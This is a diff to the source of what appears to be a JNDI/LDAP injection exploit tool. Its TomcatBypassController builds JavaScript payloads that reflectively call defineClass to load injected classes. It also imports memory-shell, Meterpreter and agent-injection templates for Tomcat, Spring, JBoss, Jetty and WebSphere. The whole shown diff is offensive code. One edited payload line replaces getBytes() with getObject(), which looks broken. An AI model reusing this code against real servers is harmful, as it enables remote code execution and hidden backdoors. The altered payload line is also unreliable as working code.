@@ -5,9 +5,12 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.gadgets.utils.InjShell;
-import com.nu1r.jndi.template.*;
 import com.nu1r.jndi.template.Agent.WinMenshell;
+import com.nu1r.jndi.template.Meterpreter;
+import com.nu1r.jndi.template.SpringEchoTemplate;
+import com.nu1r.jndi.template.TomcatEchoTemplate;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
+import com.nu1r.jndi.template.isSuccess;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
 import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
@@ -23,16 +26,17 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import javassist.*;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
-import java.lang.reflect.InvocationTargetException;
-
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
-import static com.nu1r.jndi.gadgets.utils.InjShell.*;
+import static com.nu1r.jndi.gadgets.utils.InjShell.TinsertLinAgent;
+import static com.nu1r.jndi.gadgets.utils.InjShell.TinsertWinAgent;
 import static com.nu1r.jndi.utils.Config.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
@@ -164,7 +168,7 @@ public class TomcatBypassController implements LdapController {
             if (thirdIndex != -1) {
                 if (thirdIndex < 0) thirdIndex = base.length();
                 try {
-                    gadgetType = gadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
+                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                 } catch (IllegalArgumentException e) {
                     throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                 }
@@ -600,7 +604,7 @@ public class TomcatBypassController implements LdapController {
                     "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                     "   clazz.newInstance();\n" +
                     "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getObject().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                     "   method.setAccessible(true);\n" +
                     "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                     "   clazz.newInstance();\n" +
@@ -624,7 +628,7 @@ public class TomcatBypassController implements LdapController {
                     "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
                     "   clazz.newInstance();\n" +
                     "}catch(err){\n" +
-                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getObject().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                     "   method.setAccessible(true);\n" +
                     "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                     "   clazz.newInstance();\n" +
